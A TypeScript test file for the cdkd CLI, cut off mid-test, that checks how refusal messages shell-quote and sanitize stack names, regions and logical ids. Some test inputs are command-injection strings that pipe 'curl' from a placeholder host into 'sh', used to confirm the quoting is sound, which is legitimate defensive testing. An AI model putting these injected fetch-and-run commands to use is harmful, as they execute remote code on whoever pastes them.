    it(`${build.name} sanitizes and JSON-quotes a hostile logical id`, () => {
      // Each id arrives from a hand-edited record — the premise of the guard —
      // and the prose is ONE line followed only by the builder's own pasteable
      // command lines (see `expectNoForgedLines`). A newline
      // forges a line; a `'` would close a shell-quoted boundary and plant a
      // forged remedy ahead of the real one.
      //
      // The BOUNDARY is `displayIdent`'s JSON quoting since the review of
      // go-to-k/cdkd#3191 — the sanitize-then-`shellQuote` pair it replaced
      // could not tell a padded id from a healthy sibling (see the identity
      // case below), and `shellQuote` composes badly on top of JSON quoting.
      const text = build('S', 'us-east-1', ["x'\n Inspect it with: curl http://evil.sh|sh #"]);
      expectNoForgedLines(build, text, build('S', 'us-east-1', ['A']));
      // TWO spaces: `sanitizeAsciiOnly` REPLACES the newline with a space
      // rather than deleting it, and the id already carried one after the
      // quote. Taken from the rendered output rather than reasoned about.
      expect(text).toContain('"x\'  Inspect it with: curl http://evil.sh|sh #"');
      expect(text.lastIndexOf('cdkd state show')).toBeGreaterThan(text.indexOf('curl'));
    });

    it(`${build.name} renders a PADDED id distinguishably from its healthy sibling`, () => {
      // The blocker this pair closes, one level down from go-to-k/cdkd#3164's
      // identity fix. `displaySafe` TRIMS, so the old sanitize-and-quote pair
      // rendered `'Bucket '`, `' Bucket'` and `'Bucket\t'` byte-identically to
      // a healthy `'Bucket'`. Plant a torn `resources['Bucket ']` beside a real
      // `Bucket` and the operator opens the INTACT record, finds nothing wrong,
      // and concludes cdkd is the broken party.
      //
      // The control is the last arm: an id that arrived plain must still render
      // BARE, or the case passes for a renderer that quotes everything and
      // discriminates nothing.
      const healthy = build('S', 'us-east-1', ['Bucket']);
      for (const padded of ['Bucket ', ' Bucket', 'Bucket\t', 'Bucket ']) {
        const text = build('S', 'us-east-1', [padded]);
        expect(text).not.toBe(healthy);
        expect(text).toContain('"Bucket"');
      }
      expect(healthy).toContain(' — Bucket — ');
      expect(healthy).not.toContain('"Bucket"');
    });

    it(`${build.name} marks a truncated id as CUT rather than with an ambiguous ellipsis`, () => {
      // `Prod...` is a legal logical id, so the `...` tail the pre-review
      // renderer emitted was indistinguishable from content.
      const text = build('S', 'us-east-1', ['B'.repeat(IDENT_MAX_CODE_POINTS + 7)]);
      expect(text).toContain('[cut: 7 more characters withheld]');
      expect(text).not.toContain('B...');
    });

    it(`${build.name} renders an id that sanitizes to nothing as ${UNRENDERABLE}`, () => {
      // An empty argument would read as a missing name rather than a damaged
      // one — the same reason `safeIdentifier` never returns ''.
      expect(build('S', 'us-east-1', ['\u0000\u0007'])).toContain(UNRENDERABLE);
    });

    it(`${build.name} shell-quotes a HOSTILE stack name and keeps the command last`, () => {
      // The stack name reaches a message in this module from an S3 key, so it
      // is no more trusted than a logical id. Probe 7 mutated only the ids.
      const hostile = "a'; curl http://x|sh; echo '";
      const text = build(hostile, 'us-east-1', ['A']);
      expect(text).not.toContain(`${hostile} --stack-region`);
      expectNoForgedLines(build, text, build('S', 'us-east-1', ['A']));
      expect(text.lastIndexOf('cdkd state show')).toBeGreaterThan(text.indexOf('curl'));
    });

    it(`${build.name} shell-quotes a HOSTILE region`, () => {
      const text = build('S', "r'; curl http://x|sh; echo '", ['A']);
      expect(text).toMatch(/--stack-region 'r'\\''/);
      expectNoForgedLines(build, text, build('S', 'us-east-1', ['A']));
    });

    it(`${build.name} renders a stack name that sanitizes to EMPTY as ${UNRENDERABLE}`, () => {
      expect(build('\u0000\u0001', 'us-east-1', ['A'])).toContain(UNRENDERABLE);
    });

    it(`${build.name} CAPS a multi-kilobyte stack name so the remedy stays on screen`, () => {
      // By the STACK rule (`STACK_REF_MAX_CODE_POINTS`, 1152), which every
      // builder in this module takes for a stack name; the cross-builder case
      // asserts the same cap for each occurrence.
      const long = build('q'.repeat(5000), 'us-east-1', ['A']);
      expect(long).toContain(`${'q'.repeat(1152)}...`);
      expect(long).not.toContain('q'.repeat(1153));
      expect(long).toContain('cdkd state show');
      // The orphan refusal prints the stack THREE times (clause, inspect and
      // drop commands), so its bound is wider; the two-copy texts keep theirs,
      // or a third copy of the name in them would pass unnoticed.
      const bound = build === malformedOrphanResourcePropertiesRefusalMessage ? 5600 : 3500;
      expect(long.length).toBeLessThan(bound);
    });

    it(`${build.name} caps a multi-kilobyte LOGICAL ID at the id's own length`, () => {
      // NOT a region-sized 128: a CloudFormation logical id is valid up
      // to IDENT_MAX_CODE_POINTS, and truncating a legitimate one names no
      // record. The at-cap arm is the control — without it the case also
      // passes for a renderer that cuts everything.
      const long = build('S', 'us-east-1', ['z'.repeat(5000)]);
      expect(long).toContain('z'.repeat(IDENT_MAX_CODE_POINTS));
      expect(long).not.toContain('z'.repeat(IDENT_MAX_CODE_POINTS + 1));
      expect(long.length).toBeLessThan(2500);
      expect(build('S', 'us-east-1', ['z'.repeat(IDENT_MAX_CODE_POINTS)])).not.toContain(
        'withheld'
      );
    });

    it(`${build.name} REFUSES an empty id list rather than rendering "holds 0"`, () => {
      // Both callers guard, but these are exported and a later one need not.
      expect(() => build('S', 'us-east-1', [])).toThrow(/at least one logical id/);
    });

    it(`${build.name} drops the region clause and the flag when the region is absent`, () => {
      // A v1 record predates the region-prefixed key layout. A placeholder
      // would put a `--stack-region` into a pasted command that selects no
      // record at all.
      const text = build('S', undefined, ['A']);
      expect(text).not.toContain('--stack-region');
      if (build === malformedOrphanResourcePropertiesRefusalMessage) {
        // `cdkd orphan` reaches this only for a legacy record with no region,
        // which `cdkd state show` refuses outright, so its text names the S3
        // object rather than ending on that command (go-to-k/cdkd#3359).
        expect(text).not.toContain('--json');
        expect(lineValue(text, 'Object key')).toBe("'<prefix>/S/state.json'");
        expect(text).toContain("in the state bucket ('cdkd state info' names it)");
      } else {
        expect(text).toContain('cdkd state show S --json');
      }
    });
  }
});

describe('the cdkd orphan properties refusal (issue go-to-k/cdkd#3318)', () => {
  /** A record whose SURVIVING `Other` entry carries the given `properties`. */
  function record(otherProperties: unknown): StackState {
    return state({
      Bucket: { physicalId: 'b', resourceType: 'AWS::S3::Bucket', properties: {} },
      Other: { physicalId: 'o', resourceType: 'AWS::S3::Bucket', properties: otherProperties },
    });
  }

  // Every shape a hand edit or a truncation leaves behind, fenced ONE AT A
  // TIME rather than as a single "not an object" case: `[]` and `5` enumerate
  // no keys, so they are the shapes a repair-to-`{}` would silently equal, and
  // ABSENT is the one `JSON.stringify` drops so a naive round-trip looks
  // clean. Measured 2026-09-17 through the real `rewriteResourceReferences`:
  // each one is carried through the rewrite VERBATIM and saved.
  for (const [label, bag] of [
    ['absent', undefined],
    ['null', null],
    ['an empty list', []],
    ['a populated list', [{ Ref: 'Bucket' }]],
    ['a number', 5],
    ['a string', 'abcdef'],
    ['a boolean', true],
  ] as const) {
    it(`refuses ${label}, naming the surviving record`, () => {
      let thrown: unknown;
      try {
        refuseMalformedResourcePropertiesForOrphan(record(bag), ['Bucket'], 'S', 'us-east-1');
      } catch (e) {
        thrown = e;
      }
      expect(thrown, `${label} was accepted; cdkd orphan would save it`).toBeInstanceOf(CdkdError);
      expect((thrown as CdkdError).code).toBe(STATE_RESOURCES_MALFORMED);
      expect((thrown as CdkdError).message).toContain('Other');
      // WIRING, not just the builder: the refusal must raise THIS container's
      // orphan text. Asserting the builder alone leaves the throw free to hand
      // back `malformedResourcePropertiesRefusalMessage`, whose diff verdict
      // `cdkd orphan` never computes — a mutation that reddened nothing until
      // this line existed.
      expect((thrown as CdkdError).message).toContain(
        malformedOrphanResourcePropertiesRefusalMessage('S', 'us-east-1', ['Other'])
      );
    });
  }

  it('FLOOR: a legitimate bag on every surviving record raises nothing', () => {
    // Without this the guard could refuse unconditionally and satisfy all
    // seven cases above.
    expect(() =>
      refuseMalformedResourcePropertiesForOrphan(
        record({ BucketName: 'o' }),
        ['Bucket'],
        'S',
        'us-east-1'
      )
    ).not.toThrow();
  });

  it('EXEMPTS the records being orphaned — the recovery path the refusal must not close', () => {
    // The decision this guard turns on. `cdkd orphan` over the DAMAGED record
    // is the per-resource way out of exactly this state, and the save cannot
    // persist a record it is deleting. A guard that ignored the orphan set
    // would refuse the one command that repairs the record.
    expect(() =>
      refuseMalformedResourcePropertiesForOrphan(record('abcdef'), ['Other'], 'S', 'us-east-1')
    ).not.toThrow();
    // ...and it is the EXCLUSION doing that, not a blanket pass: the same
    // record with a different orphan set still refuses.
    expect(() =>
      refuseMalformedResourcePropertiesForOrphan(record('abcdef'), ['Bucket'], 'S', 'us-east-1')
    ).toThrow(/Other/);
  });

  it('names only the surviving damaged records, never the orphaned ones', () => {
    // Two damaged records, one of them being orphaned. Naming it would point
    // the operator at a record that is about to be gone.
    const both = state({
      Bucket: { physicalId: 'b', resourceType: 'AWS::S3::Bucket', properties: 'torn' },
      Other: { physicalId: 'o', resourceType: 'AWS::S3::Bucket', properties: 'torn' },
    });
    let message = '';
    try {
      refuseMalformedResourcePropertiesForOrphan(both, ['Bucket'], 'S', 'us-east-1');
    } catch (e) {
      message = (e as Error).message;
    }
    expect(message).toContain('1 resource record(s)');
    expect(message).toContain('Other');
    expect(message, 'the refusal names a record this run is deleting').not.toContain('Bucket');
  });

  it('takes the CALLER identity rather than the record body', () => {
    // A record can carry any `stackName` / `region` it likes; `cdkd orphan`
    // resolves both from the synthesized app and from `pickStackRegion`, so
    // the message must render what it is HANDED.
    const planted = record('abcdef');
    planted.stackName = 'prod-payments';
    planted.region = 'eu-west-1';
    let message = '';
    try {
      refuseMalformedResourcePropertiesForOrphan(planted, ['Bucket'], 'dev', 'us-east-1');
    } catch (e) {
      message = (e as Error).message;
    }
    // `shellQuote` leaves a plain identifier unquoted, which is why this reads
    // bare — the identity is still the one the CALLER passed.
    expect(message).toContain('State for dev (us-east-1)');
    expect(message).toContain('cdkd state show dev --stack-region us-east-1 --json');
    expect(message).not.toContain('prod-payments');
    expect(message).not.toContain('eu-west-1');
  });

  it('states the consequence NEITHER the deploy nor the outputs refusal states', () => {
    const text = malformedOrphanResourcePropertiesRefusalMessage('S', 'us-east-1', ['A']);
    // Measured: `rewriteValue` returns a non-object verbatim, so nothing is
    // fabricated here. Borrowing the outputs refusal's laundering sentence
    // would state a mechanism that does not happen — the defect class this
    // module's per-text split exists to avoid.
    expect(malformedOutputsRefusalMessage('S', 'us-east-1')).toContain(
      'saved back as a well-formed'
    );
    expect(text).not.toContain('saved back as a well-formed');
    expect(text).toContain('carried through VERBATIM');
    // And not the deploy text's diff verdict, which this command never
    // computes. Pinned against the sibling's real wording so it cannot rot.
    expect(malformedResourcePropertiesRefusalMessage('S', 'us-east-1', ['A'])).toContain(
      'a DELETE and re-create of resources the template did not change'
    );
    expect(text).not.toContain('a DELETE and re-create of resources the template did not change');
  });

  it('is true under --dry-run and says so', () => {
    // The guard sits at the load, above the `if (options.dryRun)` return, so a
    // dry run reaches it. A plausible rewrite audit table followed by a
    // refusal the moment the flag comes off is the worst arm of all.
    expect(malformedOrphanResourcePropertiesRefusalMessage('S', 'us-east-1', ['A'])).toContain(
      "under '--dry-run' too"
    );
  });

  it('offers TWO template-free ways out, and states the condition on the third', () => {
    // The security review of go-to-k/cdkd#3318 found the first revision naming
    // only `cdkd orphan <its construct path>`, unconditionally. Construct paths
    // come from the SYNTHESIZED template, so a record the CDK app no longer
    // declares has none: that instruction dies on `Construct path '...' not
    // found in template`, and the operator is left with a refusal whose only
    // remedy is impossible. A refusal that misstates the next step is the class
    // this module's own notes record.
    const text = malformedOrphanResourcePropertiesRefusalMessage('S', 'us-east-1', ['A']);
    expect(text).toContain('repair the record by hand');
    // WITH `--stack-region`, and with the caller's real values substituted:
    // `cdkd state orphan <stack>` alone drops that name's record in EVERY
    // region, which is wider than this message describes (security review of
    // go-to-k/cdkd#3318, round 2). The sibling case below pins the no-region
    // arm, where the bare form IS correct because a region-less record is a v1
    // one and is not region-partitioned.
    expect(text).toMatch(/^Drop the record: cdkd state orphan S --stack-region us-east-1$/m);

    // The other two arms of the same remedy, neither of which any test reached
    // before (security review of go-to-k/cdkd#3318, round 3 — it found the
    // `''` arm live and UNFENCED, and the arm the JSDoc defends unreachable).
    //
    // `undefined` is what `cdkd orphan` hands this for a legacy record whose
    // body names no region -- the region it is LISTED under
    // (go-to-k/cdkd#3359) -- and it must produce the BARE command. A
    // placeholder here selects no record whatever the operator fills in.
    const legacyUndef = malformedOrphanResourcePropertiesRefusalMessage('S', undefined, ['R']);
    expect(legacyUndef).toMatch(/^Drop the record: cdkd state orphan S$/m);
    expect(legacyUndef).not.toContain('--stack-region');
    // And it does not end on `cdkd state show`, which refuses a region-less
    // legacy record with or without the flag; it names the object instead.
    expect(legacyUndef).not.toContain('--json');
    expect(lineValue(legacyUndef, 'Object key')).toBe("'<prefix>/S/state.json'");
    expect(legacyUndef).toContain("in the state bucket ('cdkd state info' names it)");
    // What the arm may claim: the record is LISTED with no region, which covers
    // a body naming none AND a probe that failed (m3 of go-to-k/cdkd#3363's
    // review); and with no recovery context the prefix is a hole the sentence
    // says how to fill.
    expect(legacyUndef).toContain(
      "listed with no region — a legacy 'state.json' whose body names none, or one the listing could not read"
    );
    // Its OWN sentence, not a second parenthetical appended to the one above:
    // the two rendered as `(... names it) (its prefix is ...)`, which reads as
    // one nested aside. The fixed flag NAME is quoted like every other in this
    // module's prose, which is also what keeps it inert if pasted.
    expect(legacyUndef).toContain(". Its prefix is 'cdkd' unless '--state-prefix' was given.");
    expect(legacyUndef).not.toMatch(/\) \(/);

    // `''` takes the same arm: the two spellings must not diverge, because
    // which one arrives depends on a caller this module does not own, and
    // `'<unrenderable>'` would additionally collide with the wrapping quotes.
    const legacy = malformedOrphanResourcePropertiesRefusalMessage('S', '', ['R']);
    expect(legacy).toMatch(/^Drop the record: cdkd state orphan S$/m);
    expect(legacy).not.toContain('--stack-region');
    expect(legacy).not.toContain('unrenderable');
    expect(legacy).not.toContain('--json');
    expect(lineValue(legacy, 'Object key')).toBe("'<prefix>/S/state.json'");

    // The object path names a REAL key only when the stack name renders
    // exactly. The name is an assembly's, which `cdkd orphan` reads unvalidated
    // from a prebuilt manifest, so one past 128 code points (a region's cap,
    // and the stack cap this path once had) is reachable and must still get its
    // full path — the `~` spelling here is a
    // hand-built manifest's, not a nested child's S3 key.
    const nested = `Root~${'N'.repeat(80)}~${'C'.repeat(80)}`;
    expect(nested.length).toBeGreaterThan(128);
    expect(
      lineValue(malformedOrphanResourcePropertiesRefusalMessage(nested, undefined, ['R']), 'Object key')
    ).toBe(`'<prefix>/${nested}/state.json'`);
    // Quoted the way every other identifier in this module is, so a quote in
    // the name cannot close the wrapping one early.
    expect(
      lineValue(malformedOrphanResourcePropertiesRefusalMessage("It's", undefined, ['R']), 'Object key')
    ).toBe(`'<prefix>/It'\\''s/state.json'`);
    // A name that would be sanitized or truncated gets NO path — a path with
    // a rewritten segment names an object that does not exist.
    // The padding class is the one that renders as a HEALTHY sibling's name
    // (`displaySafe` trims), so it is listed by name rather than left to the
    // control-character case to imply.
    for (const hostile of [
      'S\u001b[31m',
      'q'.repeat(STACK_REF_MAX_CODE_POINTS + 1),
      'prod-api ',
      ' prod-api',
    ]) {
      const withheld = malformedOrphanResourcePropertiesRefusalMessage(hostile, undefined, ['R']);
      expect(withheld).not.toContain('<prefix>/');
      expect(lineValue(withheld, 'Object key')).toBeUndefined();
      expect(withheld).toContain(
        // `'state.json'` quoted, matching the lead sentence two clauses up —
        // the module quotes every fixed name in its prose, and the round-5
        // rewording had left this one bare.
        "it is the legacy 'state.json' under this stack name, which did not render exactly, in the state bucket"
      );
    }

    // No trusted stack at all degrades the whole command to a template, where
    // the `<region>` placeholder IS right -- it reads as a hole to fill rather
    // than a command to run.
    const noStack = malformedOrphanResourcePropertiesRefusalMessage(undefined, undefined, ['R']);
    expect(noStack).toMatch(/^Drop the record: cdkd state orphan \'<stack>\' --stack-region \'<region>\'$/m);
    expect(noStack).toContain('cdkd state show \'<stack>\' --stack-region \'<region>\' --json');
    expect(text).toContain('only while the CDK app STILL DECLARES');
    expect(text).toContain('a resource the app no longer declares has none');
    expect(text).toContain('No state was written');
  });

  /**
   * go-to-k/cdkd#3360 (the M0 finding of go-to-k/cdkd#3363's review): the drop
   * remedy DELETES, and since #3359 the legacy shape carries no `--stack-region`,
   * so the substituted name is the only thing narrowing it. The name comes from
   * the assembly, which a prebuilt manifest can fill with anything.
   */
  describe('the drop remedy is gated on an EXACT identity (go-to-k/cdkd#3360)', () => {
    /** The command on the message's trailing `Drop the record:` line. */
    function dropOf(message: string): string {
      const m = /^Drop the record: (cdkd state orphan .*)$/m.exec(message);
      expect(m, 'the drop remedy is no longer rendered in the expected shape').not.toBeNull();
      return m![1]!;
    }
    // `--json`, not `--long`: the latter renders through `displayIdent`, which
    // trims, so it would hand back the very spelling the gate refused.
    const HINT = "take them from the 'Find the exact name' command below";
    // B2 of the fourth review: the holes are quoted now, so "shell-quote them"
    // would have an operator quote INSIDE `'<stack>'`, which bash splits and
    // which re-opens go-to-k/cdkd#3360. The hint says to replace the whole hole.
    const HINT_HOW = 'replace each quoted hole, quotes included, with the shell-quoted value';

    it('substitutes an ordinary exact name, so a gate that always withholds is caught', () => {
      const text = malformedOrphanResourcePropertiesRefusalMessage('My-App-Stack', 'us-east-1', ['A']);
      expect(dropOf(text)).toBe('cdkd state orphan My-App-Stack --stack-region us-east-1');
      expect(text).not.toContain(HINT);
    });

    it('keeps the FULL name of a hand-crafted-manifest name past 128 code points', () => {
      // At 128 the command ended in a literal `...`, which `cdkd state orphan`
      // resolves to zero records and reports as a skip at exit 0 — a silent
      // no-op remedy printed beside a correct object path. The `~` spelling is
      // a hand-built manifest's, not an S3 key's: an assembly name cannot
      // acquire a nested child's key spelling, but nothing validates it either.
      const nested = `Root~${'N'.repeat(80)}~${'C'.repeat(80)}`;
      const text = malformedOrphanResourcePropertiesRefusalMessage(nested, undefined, ['A']);
      expect(dropOf(text)).toBe(`cdkd state orphan '${nested}'`);
      expect(dropOf(text)).not.toContain('...');
      expect(text).not.toContain(HINT);
    });

    it('withholds a name that sanitizing would ALTER, and says where to take it from', () => {
      // `'prod-api '` renders as `prod-api` — a healthy sibling's name — and the
      // bare form then drops that record in every region.
      for (const [name, region, expected] of [
        ['prod-api ', undefined, 'cdkd state orphan \'<stack>\''],
        [' prod-api', undefined, 'cdkd state orphan \'<stack>\''],
        ['prod-api ', 'us-east-1', 'cdkd state orphan \'<stack>\' --stack-region us-east-1'],
        ['S\u001b[31m', 'us-east-1', 'cdkd state orphan \'<stack>\' --stack-region us-east-1'],
        ['caf\u00e9', 'us-east-1', 'cdkd state orphan \'<stack>\' --stack-region us-east-1'],
        ['q'.repeat(STACK_REF_MAX_CODE_POINTS + 1), undefined, 'cdkd state orphan \'<stack>\''],
      ] as const) {
        const text = malformedOrphanResourcePropertiesRefusalMessage(name, region, ['A']);
        expect(dropOf(text), JSON.stringify(name)).toBe(expected);
        expect(text, JSON.stringify(name)).toContain(HINT);
        expect(text, JSON.stringify(name)).toContain(HINT_HOW);
      }
    });

    it('prints NO hint when no name was known at all — that template is already a hole', () => {
      // The guard is what keeps an unknown-identity template from acquiring a
      // "did not render exactly" sentence about a name the message never had.
      for (const name of [undefined, '']) {
        const text = malformedOrphanResourcePropertiesRefusalMessage(name, undefined, ['A']);
        expect(dropOf(text)).toBe('cdkd state orphan \'<stack>\' --stack-region \'<region>\'');
        expect(text, JSON.stringify(name)).not.toContain('did not render exactly');
      }
    });

    it('withholds an altered REGION too, keeping the exact name a hole as well', () => {
      const text = malformedOrphanResourcePropertiesRefusalMessage('S', 'us-east-1 ', ['A']);
      expect(dropOf(text)).toBe('cdkd state orphan \'<stack>\' --stack-region \'<region>\'');
      expect(text).toContain(HINT);
    });

    it('shell-quotes an exact region in BOTH arms, and the hint carries the recovery flags', () => {
      // A region that renders exactly but is not shell-plain: quoted in the
      // substituted arm and in the template arm that keeps it.
      const sub = malformedOrphanResourcePropertiesRefusalMessage('S', "it's", ['A']);
      expect(dropOf(sub)).toBe("cdkd state orphan S --stack-region 'it'\\''s'");
      const tpl = malformedOrphanResourcePropertiesRefusalMessage('S ', "it's", ['A'], {
        profile: 'prod',
        stateBucket: 'b',
        statePrefix: 'x',
      });
      expect(dropOf(tpl)).toBe(
        "cdkd state orphan \'<stack>\' --stack-region 'it'\\''s' --profile prod --state-bucket b --state-prefix x"
      );
      // The listing the hint sends the operator to must read the SAME bucket.
      expect(tpl).toContain(HINT);
      expect(tpl).toMatch(
        /^Find the exact name: cdkd state list --json --profile prod --state-bucket b --state-prefix x$/m
      );
    });

    /**
     * The residuals go-to-k/cdkd#3439 collected from go-to-k/cdkd#3363's five
     * review rounds. Each assertion here was GREEN under the mutation it exists
     * to catch before this test was written — that, not the behaviour, is what
     * they add.
     */
    describe('the residual fences (go-to-k/cdkd#3439)', () => {
      it('never re-admits "shell-quote them", the wording that re-opens go-to-k/cdkd#3360', () => {
        // HINT_HOW replaced it in round 5, but only the NEW phrasing was pinned:
        // keeping HINT_HOW and re-inserting the old sentence left the suite
        // green, so the misdirection could come back beside its own remedy.
        // Quoting INSIDE `'<stack>'` gives `''prod-api ''`, which bash splits
        // into `prod-api` and `''` — the healthy sibling.
        for (const [name, region] of [
          ['prod-api ', undefined],
          ['prod-api ', 'us-east-1'],
          ['S', 'us-east-1 '],
        ] as const) {
          const text = malformedOrphanResourcePropertiesRefusalMessage(name, region, ['A']);
          expect(text, JSON.stringify([name, region])).toContain(HINT_HOW);
          expect(text, JSON.stringify([name, region])).not.toContain('shell-quote them');
        }
      });

      it('keeps the sentence POINTING at the location lines it promises', () => {
        // Round 5 moved the object's key and bucket onto labelled trailing
        // lines because a `shellQuote`d value after an apostrophe in prose was
        // pasteable (B1). The pointer is what makes that readable, and deleting
        // both pointer phrases while keeping the lines left the suite green.
        const text = malformedOrphanResourcePropertiesRefusalMessage('S', undefined, ['A'], {
          stateBucket: 'b1',
          statePrefix: 'custom',
        });
        expect(text).toContain("the 'Object key' line below names it");
        expect(text).toContain("in the bucket on the 'State bucket' line below");
        expect(lineValue(text, 'Object key')).toBe('custom/S/state.json');
        expect(lineValue(text, 'State bucket')).toBe('b1');
      });

      it('prints NO location line it did not promise, and none at all without a context', () => {
        // The "neither line" arm: with no recovery there is no bucket to name,
        // and the sentence must send the operator to `cdkd state info` instead.
        // Injecting a spurious `State bucket:` line left the suite green.
        const bare = malformedOrphanResourcePropertiesRefusalMessage('S', undefined, ['A']);
        expect(lineValue(bare, 'State bucket')).toBeUndefined();
        expect(bare).toContain("in the state bucket ('cdkd state info' names it)");
        // And the key line is still there — this arm loses the BUCKET, not the
        // object, so an assertion that merely counted lines would pass wrongly.
        expect(lineValue(bare, 'Object key')).toBe("'<prefix>/S/state.json'");
      });

      it('treats an EMPTY bucket as no bucket, the way the flags do', () => {
        // Round 5 regressed the `''` floor here from truthiness to
        // `=== undefined`, so `State bucket: ''` printed while the sentence
        // promised that line named the bucket — and `recoveryCommandFlags`
        // emits no `--state-bucket` for `''`, so one value had two rules.
        const text = malformedOrphanResourcePropertiesRefusalMessage('S', undefined, ['A'], {
          stateBucket: '',
        });
        expect(lineValue(text, 'State bucket')).toBeUndefined();
        expect(text).toContain("in the state bucket ('cdkd state info' names it)");
        expect(text).not.toContain("State bucket: ''");
        // An empty PREFIX is the opposite call and must stay: `/S/state.json`
        // is a real key space, which is why the flag emits `--state-prefix ''`.
        const emptyPrefix = malformedOrphanResourcePropertiesRefusalMessage('S', undefined, ['A'], {
          stateBucket: 'b1',
          statePrefix: '',
        });
        expect(lineValue(emptyPrefix, 'Object key')).toBe('/S/state.json');
      });

      it('renders an EMPTY stack name as no identity at all, in every line', () => {
        // The OBSERVABLE half of the empty-stack rule. It does NOT cover
        // `orphanInspectClause`'s own `''` floor — the builder normalises `''`
        // to `undefined` at entry, so this case passes just as happily on a tree
        // that lacks that floor (measured). The floor is held by the structural
        // fence below; what this pins is that the entry normalisation reaches
        // every line, which is the thing a caller can actually observe.
        const text = malformedOrphanResourcePropertiesRefusalMessage('', 'us-east-1', ['A']);
        expect(lineValue(text, 'Inspect the record')).toBe(
          "cdkd state show '<stack>' --stack-region '<region>' --json"
        );
        expect(lineValue(text, 'Drop the record')).toBe(
          "cdkd state orphan '<stack>' --stack-region '<region>'"
        );
        // ...and identically to `undefined`, which is what "normalised at
        // entry" means and what a divergence here would show.
        expect(text).toBe(
          malformedOrphanResourcePropertiesRefusalMessage(undefined, 'us-east-1', ['A'])
        );
      });

      it('says a RECOVERY fragment is a hole, which no identity clause covers', () => {
        // `identityWithheld` reads the stack name and the region only, so a run
        // whose PREFIX or BUCKET was the inexact value printed
        // `--state-prefix '<prefix>'` with nothing saying it was a hole — and
        // the object-path note is suppressed whenever a prefix WAS supplied.
        const text = malformedOrphanResourcePropertiesRefusalMessage('S', 'us-east-1', ['A'], {
          stateBucket: 'b1',
          statePrefix: 'pre\u001b[31m',
        });
        expect(lineValue(text, 'Drop the record')).toContain("--state-prefix '<prefix>'");
        expect(text).toContain('so the command lines below print a quoted hole in its place');
        // The clause is about the COMMAND lines, and the object key's own hole
        // is a different shape — `<prefix>` INSIDE the quotes wrapping the key,
        // where "replace it, quotes included" would build
        // `''custom''/S/state.json'`. It gets its own sentence, at the line it
        // is on (go-to-k/cdkd#3439 review).
        // The object key only prints on the legacy region-less arm, so the
        // second half of the rule is checked there.
        const legacy = malformedOrphanResourcePropertiesRefusalMessage('S', undefined, ['A'], {
          stateBucket: 'b1',
          statePrefix: 'pre\u001b[31m',
        });
        expect(lineValue(legacy, 'Object key')).toBe("'<prefix>/S/state.json'");
        // QUOTED in the prose too: a bare `<prefix>` is a shell redirection,
        // and prose is pasteable — the first cut of this sentence truncated a
        // file named `where` when selected and pasted.
        expect(legacy).toContain("the key shows the hole '<prefix>' where it belongs");
        expect(legacy).not.toMatch(/[^']<prefix>[^']/);
        expect(legacy).not.toContain("Its prefix is 'cdkd' unless");
        // It is NOT the identity clause: that one sends the operator to a
        // listing, which does not carry their `--profile`.
        expect(text).not.toContain(HINT);
        // And an all-exact run says nothing of the kind.
        const clean = malformedOrphanResourcePropertiesRefusalMessage('S', 'us-east-1', ['A'], {
          stateBucket: 'b1',
          statePrefix: 'pre',
        });
        expect(clean).not.toContain('print a quoted hole in its place');
      });
    });

    it('qualifies a substituted command with the caller profile, bucket and non-default prefix', () => {
      const recovery = { profile: 'prod', stateBucket: 'cdkd-state-1', statePrefix: 'cdkd' };
      const text = malformedOrphanResourcePropertiesRefusalMessage('S', 'us-east-1', ['A'], recovery);
      expect(dropOf(text)).toBe(
        'cdkd state orphan S --stack-region us-east-1 --profile prod --state-bucket cdkd-state-1'
      );
      const custom = malformedOrphanResourcePropertiesRefusalMessage('S', undefined, ['A'], {
        ...recovery,
        statePrefix: 'custom',
      });
      expect(dropOf(custom)).toBe(
        'cdkd state orphan S --profile prod --state-bucket cdkd-state-1 --state-prefix custom'
      );
      // The object path takes the REAL prefix and names the bucket, and the
      // fill-in parenthetical goes away with them.
      expect(lineValue(custom, 'Object key')).toBe('custom/S/state.json');
      expect(lineValue(custom, 'State bucket')).toBe('cdkd-state-1');
      expect(custom).not.toContain('<prefix>');
      expect(custom).not.toContain("unless --state-prefix was given");
      // The bucket is shell-quoted like every other value in a pasted line.
      const quoted = malformedOrphanResourcePropertiesRefusalMessage('S', undefined, ['A'], {
        stateBucket: "it's",
        statePrefix: 'cdkd',
      });
      expect(dropOf(quoted)).toBe("cdkd state orphan S --state-bucket 'it'\\''s'");
      expect(lineValue(quoted, 'Object key')).toBe('cdkd/S/state.json');
      expect(lineValue(quoted, 'State bucket')).toBe("'it'\\''s'");
      // An EMPTY prefix is accepted by the CLI and keys records under `/`, so
      // it is emitted (quoted) rather than dropped as falsy, and the path and
      // its fill-in note follow the same rule.
      const empty = malformedOrphanResourcePropertiesRefusalMessage('S', undefined, ['A'], {
        ...recovery,
        statePrefix: '',
      });
      expect(dropOf(empty)).toBe(
        "cdkd state orphan S --profile prod --state-bucket cdkd-state-1 --state-prefix ''"
      );
      expect(lineValue(empty, 'Object key')).toBe('/S/state.json');
      expect(lineValue(empty, 'State bucket')).toBe('cdkd-state-1');
      expect(empty).not.toContain("unless --state-prefix was given");
      // The TEMPLATE keeps the account too: the identity is the hole, not the
      // account, and an operator who fills only the hole must still reach this
      // bucket (the M3 finding of go-to-k/cdkd#3363's review).
      const withheld = malformedOrphanResourcePropertiesRefusalMessage('S ', undefined, ['A'], recovery);
      expect(dropOf(withheld)).toBe(
        'cdkd state orphan \'<stack>\' --profile prod --state-bucket cdkd-state-1'
      );
      expect(lineValue(withheld, 'State bucket')).toBe('cdkd-state-1');
      expect(lineValue(withheld, 'Object key')).toBeUndefined();
    });

    /**
     * M2 of the same review: the `cdkd state show` line two sentences below the
     * drop command is the SAME identity, so it takes the same gate. Gating only
     * the drop command made one message say the name did not render exactly and
     * then print its trimmed spelling anyway.
     */
    it('gates the cdkd state show line with the drop command, so one message cannot disagree with itself', () => {
      const recovery = { profile: 'prod', stateBucket: 'b', statePrefix: 'cdkd' };
      const inspectOf = (text: string): string => {
        const m = /^Inspect the record: (cdkd state show .*)$/m.exec(text);
        expect(m, 'the inspect line is no longer rendered in the expected shape').not.toBeNull();
        return m![1]!;
      };
      // Exact: substituted, full spelling past 128 code points, qualified.
      const long = 'L'.repeat(200);
      expect(
        inspectOf(malformedOrphanResourcePropertiesRefusalMessage(long, 'us-east-1', ['A'], recovery))
      ).toBe(`cdkd state show ${long} --stack-region us-east-1 --json --profile prod --state-bucket b`);
      // Name altered: the name is a hole, the exact region is kept.
      for (const name of ['prod-api ', 'S\u001b[31m', 'q'.repeat(STACK_REF_MAX_CODE_POINTS + 1)]) {
        const text = malformedOrphanResourcePropertiesRefusalMessage(name, 'us-east-1', ['A'], recovery);
